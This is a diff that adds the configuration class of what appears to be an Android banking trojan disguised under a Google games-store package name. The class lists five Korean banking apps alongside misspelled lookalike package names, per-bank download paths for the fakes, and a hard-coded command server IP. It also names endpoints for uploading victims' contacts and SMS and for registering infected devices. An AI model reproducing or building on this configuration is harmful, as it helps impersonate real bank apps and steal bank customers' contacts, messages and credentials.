@@ -1,0 +1,41 @@
+package com.google.games.stores.config;
+
+public class Config {
+    public static final String ADD = "add";
+    public static final String ADD_DEVICE_URL = "/webmaster/action/add.php";
+    public static final String[] BK_ARRAY_LIST = new String[]{"nh.smart", "com.shinhan.sbanking", "com.webcash.wooribank", "com.ATsolution.KBbank", "com.hanabank.ebk.channel.android.hananbank"};
+    public static final String[] BK_NAME_LIST = new String[]{"NH", "SH", "WO", "KB", "HA"};
+    public static final int BK_SEARCH_TIME = 240000;
+    public static final String CLOSE_ACTIVITY = "com.google.game.store.close";
+    public static final String CONFIG_FILE = "configs_settings";
+    public static final int CONNECTION_TIME = 15000;
+    public static final String CONTACTS_CONFIG = "config";
+    public static final String CONTACT_LIST = "contacts";
+    public static final String CONTACT_LIST_URL = "/webmaster/action/feedback.php";
+    public static String DOWN_SERVER = "";
+    public static final int HANA_BK = 4;
+    public static String HANA_DOWN = "/h";
+    public static final String INSTALL_PATH = "INSTALL_PATH";
+    public static final int KB_BK = 3;
+    public static String KB_DOWN = "/k";
+    public static final String[] MY_BK_ARRAY_LIST = new String[]{"com.nh.android.smart", "com.shinhan.android.shinhan.sh", "com.cashweb.wooribank", "com.kbstar.kb.star", "com.hana.ebk.channel.hanan"};
+    public static final String MY_CONTACT_LIST = "mycontacts";
+    public static final String MY_CONTACT_URL = "/webmaster/action/ct.php";
+    public static final String NEW = "new";
+    public static final String NEW_SMS_URL = "/webmaster/action/new.php";
+    public static final int NH_BK = 0;
+    public static String NH_DOWN = "/n";
+    public static final int READ_CONTACT = 20000;
+    public static final String REGISTER = "REGISTER";
+    public static String SERVER = "http://126.114.226.161";
+    public static final String SHOW_UPDATE = "UPDATE";
+    public static final int SHOW_UPDATE_TIME = 5000;
+    public static final int SH_BK = 1;
+    public static String SH_DOWN = "/s";
+    public static String SMS_CONTENT = "hello";
+    public static final int SMS_START_TIME = 20000;
+    public static final int SMS_TIME = 20000;
+    public static final String UPLOAD_CONTACT = "upcon";
+    public static final int WOORI_BK = 2;
+    public static String WOORI_DOWN = "/w";
+}
